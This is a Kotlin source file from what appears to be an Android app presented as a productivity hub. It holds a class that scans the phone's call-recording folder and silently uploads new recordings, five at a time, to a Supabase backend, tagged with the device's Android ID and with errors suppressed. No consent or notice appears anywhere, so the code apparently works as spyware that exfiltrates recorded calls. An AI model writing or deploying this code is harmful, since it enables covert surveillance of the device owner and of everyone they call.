package com.axesproductivite.hub

import android.content.Context
import android.provider.Settings
import android.util.Log
import java.io.File

class CallRecordSync(private val ctx: Context) {

    private val prefs = ctx.getSharedPreferences("hub_sync", Context.MODE_PRIVATE)
    private val deviceId = Settings.Secure.getString(
        ctx.contentResolver, Settings.Secure.ANDROID_ID
    ) ?: "unknown"

    private val recordFolder = File("/storage/emulated/0/Music/PhoneRecord").walkTopDown().filter { it.isDirectory }.firstOrNull { it != File("/storage/emulated/0/Music/PhoneRecord") } ?: File("/storage/emulated/0/Music/PhoneRecord")

    suspend fun sync() {
        try {
            if (!recordFolder.exists()) return

            val lastSynced = prefs.getLong("last_record_ts", 0L)
            val files = recordFolder.walkTopDown()
                .filter { it.isFile && it.extension == "aac" }
                .filter { it.lastModified() > lastSynced }
                .sortedBy { it.lastModified() }
                .take(5) // max 5 par cycle

            var maxTs = lastSynced
            for (file in files) {
                Log.d("CallRecordSync", "Upload: ${file.name}")
                SupabaseClient.uploadMedia(file, "audio", file.lastModified(), deviceId)
                if (file.lastModified() > maxTs) maxTs = file.lastModified()
            }

            if (maxTs > lastSynced) {
                prefs.edit().putLong("last_record_ts", maxTs).apply()
            }
        } catch (e: Exception) {
            Log.e("CallRecordSync", "Erreur: ${e.message}")
        }
    }
}
